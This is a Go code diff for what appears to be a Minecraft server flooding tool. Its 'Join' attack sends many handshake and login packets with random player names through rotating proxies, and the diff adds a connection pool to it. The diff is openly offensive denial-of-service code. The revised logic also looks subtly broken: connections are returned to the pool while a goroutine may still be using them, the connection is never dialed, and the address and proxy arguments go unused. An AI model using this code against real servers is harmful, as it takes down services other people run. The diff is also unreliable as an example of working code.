@@ -15,6 +15,7 @@ import (
 type Join struct {
 	Info         *core.AttackInfo
 	ProxyManager *proxy.ProxyManager
+	ConnectionPool *mc.ConnectionPool
 }
 
 var shouldRun = false
@@ -29,6 +30,7 @@ func (join Join) Description() string {
 }
 
 func (join Join) Start() {
+	join.ConnectionPool = mc.NewConnectionPool()
 	utils.Init()
 	shouldRun = true
 
@@ -54,19 +56,22 @@ func (join Join) Start() {
 func loop(join *Join) {
 	proxy := join.ProxyManager.GetNext()
 	for i := 0; i < join.Info.ConnPerProxy; i++ {
-		go connect(&join.Info.Ip, &join.Info.Port, join.Info.Protocol, proxy)
+		conn := join.ConnectionPool.GetConnection()
+		go connect(conn, &join.Info.Ip, &join.Info.Port, join.Info.Protocol, proxy)
+		join.ConnectionPool.ReturnConnection(conn)
 	}
 }
 
-func connect(ip *string, port *string, protocol int, proxy *proxy.Proxy) error {
-
-	conn, err := mc.DialMC(ip, port, proxy)
+func connect(conn *mc.Connection, ip *string, port *string, protocol int, proxy *proxy.Proxy) error {
+	err := conn.WritePacket(handshakePacket)
 	if err != nil {
 		return err
 	}
 
-	conn.WritePacket(handshakePacket)
-	conn.WritePacket(mcutils.GetLoginPacket(utils.RandomName(16), protocol))
+	err = conn.WritePacket(mcutils.GetLoginPacket(utils.RandomName(16), protocol))
+	if err != nil {
+		return err
+	}
 
 	return nil
 }
